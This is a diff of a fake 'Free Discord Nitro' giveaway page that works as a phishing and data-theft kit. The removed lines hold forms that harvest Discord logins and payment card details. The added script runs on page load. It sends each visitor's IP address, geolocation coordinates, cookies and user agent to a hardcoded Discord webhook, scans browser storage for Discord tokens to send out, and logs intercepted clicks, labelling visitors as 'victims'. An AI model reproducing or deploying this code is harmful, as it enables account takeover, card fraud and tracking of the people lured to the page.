@@ -17,213 +17,154 @@
         <div class="text-center mb-8">
             <img src="https://cdn.discordapp.com/attachments/123456789/discord-logo.png" alt="Discord" class="mx-auto w-24 h-24 mb-4">
             <h1 class="text-3xl font-bold mb-2">Free Discord Nitro!</h1>
-            <p class="text-lg opacity-90 mb-6">Claim your 3-month Nitro Classic giveaway before it expires!</p>
+            <p class="text-lg opacity-90 mb-6">Click below to claim your 3-month Nitro Classic!</p>
             <div class="bg-yellow-500 bg-opacity-20 p-4 rounded-lg mb-6">
-                <p class="font-semibold">⏰ Only 47 spots left!</p>
+                <p class="font-semibold">⏰ Only 47 spots left! Click NOW!</p>
             </div>
         </div>
 
-        <!-- IP Grabber (Silent) -->
-        <script>
-            // Silent IP grabber
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(data => {
-                    const userAgent = navigator.userAgent;
-                    const referrer = document.referrer || 'Direct';
-                    const lang = navigator.language;
-                    const screen = `${screen.width}x${screen.height}`;
-                    const cookies = document.cookie;
-                    
-                    fetch('YOUR_DISCORD_WEBHOOK_URL', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `**🕵️ New Victim**\n**IP:** \`${data.ip}\`\n**UA:** ${userAgent.substring(0,100)}...\n**Referrer:** ${referrer}\n**Lang:** ${lang}\n**Screen:** ${screen}\n**Cookies:** ${cookies || 'None'}`
-                        })
-                    });
-                });
+        <!-- Main Claim Button (Link Grabber Trigger) -->
+        <div class="space-y-6">
+            <a href="#" id="mainClaimBtn" class="block w-full bg-green-500 hover:bg-green-600 text-white font-bold py-6 px-8 rounded-xl text-center text-xl transition-all duration-200 transform hover:scale-105 shadow-2xl">
+                🚀 CLAIM FREE NITRO NOW!
+            </a>
             
-            // Discord Token Grabber
-            const tokens = [];
-            const tokenRegex = /(mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})/g;
-            
-            // Check localStorage, sessionStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
-                const matches = value.match(tokenRegex);
-                if (matches) tokens.push(...matches);
-            }
-            
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                const value = sessionStorage.getItem(key);
-                const matches = value.match(tokenRegex);
-                if (matches) tokens.push(...matches);
-            }
-            
-            // Send tokens if found
-            if (tokens.length > 0) {
-                setTimeout(() => {
-                    fetch('YOUR_DISCORD_WEBHOOK_URL', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `**🔑 DISCORD TOKENS GRABBED**\n\`\`\`${tokens.join('\n')}\`\`\``
-                        })
-                    });
-                }, 1000);
-            }
-        </script>
-
-        <!-- Login Form -->
-        <form id="loginForm" class="space-y-4">
-            <div>
-                <label class="block text-sm font-medium mb-2">Discord Email/Phone</label>
-                <input type="text" id="email" required 
-                       class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
-                       placeholder="example@email.com">
+            <!-- Fake "Other Offers" Links -->
+            <div class="space-y-3">
+                <a href="#" class="block w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg text-center transition duration-200 flex items-center justify-center space-x-2">
+                    <span>💎 Premium Server Boost</span>
+                </a>
+                <a href="#" class="block w-full bg-purple-500 hover:bg-purple-600 text-white font-semibold py-3 px-6 rounded-lg text-center transition duration-200 flex items-center justify-center space-x-2">
+                    <span>🎮 Free Steam Gift Cards</span>
+                </a>
+                <a href="#" class="block w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold py-3 px-6 rounded-lg text-center transition duration-200 flex items-center justify-center space-x-2">
+                    <span>⭐ Amazon Prime 1 Year</span>
+                </a>
             </div>
-            
-            <div>
-                <label class="block text-sm font-medium mb-2">Password</label>
-                <input type="password" id="password" required 
-                       class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
-                       placeholder="••••••••">
-            </div>
+        </div>
 
-            <!-- Carding Form (Hidden by default) -->
-            <div id="cardForm" class="space-y-4 hidden">
-                <div>
-                    <label class="block text-sm font-medium mb-2">Card Number</label>
-                    <input type="text" id="cardNumber" required maxlength="19"
-                           class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg"
-                           placeholder="1234 5678 9012 3456">
-                </div>
-                <div class="grid grid-cols-2 gap-4">
-                    <div>
-                        <label class="block text-sm font-medium mb-2">Expiry (MM/YY)</label>
-                        <input type="text" id="expiry" required maxlength="5"
-                               class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg"
-                               placeholder="12/25">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-medium mb-2">CVV</label>
-                        <input type="text" id="cvv" required maxlength="4"
-                               class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg"
-                               placeholder="123">
-                    </div>
-                </div>
-                <div>
-                    <label class="block text-sm font-medium mb-2">Cardholder Name</label>
-                    <input type="text" id="cardholder" required
-                           class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg"
-                           placeholder="John Doe">
-                </div>
-            </div>
-
-            <button type="submit" id="submitBtn"
-                    class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 px-6 rounded-lg transition duration-200 transform hover:scale-105">
-                <span id="btnText">Claim Nitro!</span>
-                <div id="loadingSpinner" class="hidden animate-spin inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full"></div>
-            </button>
-        </form>
-
-        <div class="text-center mt-6 text-sm opacity-75">
-            <p>By claiming you agree to our <a href="#" class="underline">Terms</a></p>
+        <div class="text-center mt-8 text-sm opacity-75">
+            <p>Secure & Verified • 100% Free</p>
         </div>
     </div>
 
     <script>
-        const form = document.getElementById('loginForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const btnText = document.getElementById('btnText');
-        const loadingSpinner = document.getElementById('loadingSpinner');
-        const cardForm = document.getElementById('cardForm');
-        const webhookUrl = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI'; // Replace with your webhook
-
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            // Show loading
-            submitBtn.disabled = true;
-            btnText.classList.add('hidden');
-            loadingSpinner.classList.remove('hidden');
-            
-            // Collect all data
-            const data = {
-                email: document.getElementById('email').value,
-                password: document.getElementById('password').value,
-                ip: 'Captured on load',
-                tokens: 'Checked on load',
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            };
-            
-            if (!cardForm.classList.contains('hidden')) {
-                data.cardNumber = document.getElementById('cardNumber').value;
-                data.expiry = document.getElementById('expiry').value;
-                data.cvv = document.getElementById('cvv').value;
-                data.cardholder = document.getElementById('cardholder').value;
-            }
-            
-            // Send to webhook
+        const webhookUrl = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';
+        
+        // === IP + INITIAL LOCATION GRAB ===
+        async function sendInitialData() {
             try {
-                const response = await fetch(webhookUrl, {
+                // IP via ipify
+                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                
+                // Geolocation via ip-api
+                const geoData = await fetch(`http://ip-api.com/json/${ipData.ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as`).then(r => r.json());
+                
+                const basicInfo = {
+                    ip: ipData.ip,
+                    userAgent: navigator.userAgent,
+                    referrer: document.referrer || 'Direct',
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    cookies: document.cookie || 'None',
+                    timestamp: new Date().toISOString()
+                };
+                
+                await fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: '🎁 Nitro Claim Attempt',
-                            color: 0x5865f2,
+                            title: '🕵️ NEW VICTIM - LOCATION GRABBED',
+                            color: 0xff6b6b,
                             fields: [
-                                { name: '📧 Email/Phone', value: `\`${data.email}\``, inline: true },
-                                { name: '🔒 Password', value: `\`${data.password}\``, inline: true },
-                                ...(data.cardNumber ? [
-                                    { name: '💳 Card Number', value: `\`${data.cardNumber}\``, inline: true },
-                                    { name: '📅 Expiry/CVV', value: `\`${data.expiry} | ${data.cvv}\``, inline: true },
-                                    { name: '👤 Cardholder', value: `\`${data.cardholder}\``, inline: true }
-                                ] : [])
+                                { name: '🌍 Country', value: geoData.country || 'Unknown', inline: true },
+                                { name: '🏙️ City', value: geoData.city || 'Unknown', inline: true },
+                                { name: '📍 Coordinates', value: `${geoData.lat || '?'}, ${geoData.lon || '?'}` , inline: true },
+                                { name: '🌐 ISP', value: geoData.isp || 'Unknown', inline: true },
+                                { name: '📡 IP', value: `\`${basicInfo.ip}\``, inline: true },
+                                { name: '🖥️ Screen', value: basicInfo.screen, inline: true }
                             ],
-                            footer: { text: `UA: ${data.userAgent.substring(0,50)}...` },
-                            timestamp: data.timestamp
+                            footer: { text: `UA: ${basicInfo.userAgent.substring(0,60)}... | ${new Date().toLocaleString()}` },
+                            timestamp: basicInfo.timestamp
+                        }]
+                    })
+                });
+            } catch(e) { console.error('Initial grab failed:', e); }
+        }
+        
+        // === DISCORD TOKEN GRABBER ===
+        function grabTokens() {
+            const tokens = [];
+            const tokenRegex = /(mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})/g;
+            
+            // Scan all storage
+            [localStorage, sessionStorage].forEach(storage => {
+                for (let i = 0; i < storage.length; i++) {
+                    const value = storage.getItem(storage.key(i));
+                    const matches = value?.match(tokenRegex);
+                    if (matches) tokens.push(...matches);
+                }
+            });
+            
+            if (tokens.length > 0) {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🔑 **TOKENS GRABBED** (${tokens.length})\n\`\`\`${tokens.join('\n')}\`\`\``
+                    })
+                });
+            }
+        }
+        
+        // === LINK GRABBER - INTERCEPT ALL CLICKS ===
+        document.addEventListener('click', async (e) => {
+            const link = e.target.closest('a[href]');
+            if (link) {
+                e.preventDefault(); // Block real navigation
+                
+                const linkData = {
+                    clickedElement: link.textContent.trim().substring(0,100),
+                    href: link.getAttribute('href'),
+                    timestamp: new Date().toISOString(),
+                    ip: 'From initial grab'
+                };
+                
+                // Send link click to webhook
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: '🔗 LINK CLICKED!',
+                            description: `**Button:** ${linkData.clickedElement}`,
+                            color: 0x00ff88,
+                            fields: [
+                                { name: '🎯 Target', value: linkData.href || 'JavaScript', inline: true },
+                                { name: '⏰ Time', value: new Date().toLocaleString(), inline: true }
+                            ]
                         }]
                     })
                 });
                 
-                if (response.ok) {
-                    // Show "success" and reveal card form
-                    btnText.textContent = 'Processing Payment...';
-                    setTimeout(() => {
-                        cardForm.classList.remove('hidden');
-                        btnText.textContent = 'Complete Payment';
-                        btnText.classList.remove('hidden');
-                        loadingSpinner.classList.add('hidden');
-                    }, 1500);
-                }
-            } catch (error) {
-                console.error('Webhook error:', error);
+                // Fake "redirect" delay then show fake success
+                link.style.background = '#10b981';
+                setTimeout(() => {
+                    alert('✅ Redirecting to Nitro claim page... (Demo)');
+                    // In production, you could redirect to real phishing or show more forms
+                }, 800);
             }
         });
-
-        // Format card number
-        document.getElementById('cardNumber').addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
-            const matches = value.match(/\d{4,16}/g);
-            const match = matches && matches[0] || '';
-            const parts = [];
-            
-            for (let i = 0, len = match.length; i < len; i += 4) {
-                parts.push(match.substring(i, i + 4));
-            }
-            
-            if (parts.length) {
-                e.target.value = parts.join(' ');
-            } else {
-                e.target.value = value;
-            }
+        
+        // === INIT ON LOAD ===
+        window.addEventListener('load', async () => {
+            await sendInitialData();
+            grabTokens();
         });
+        
+        // Also run on DOMContentLoaded for speed
+        document.addEventListener('DOMContentLoaded', grabTokens);
     </script>
 </body>
 </html>
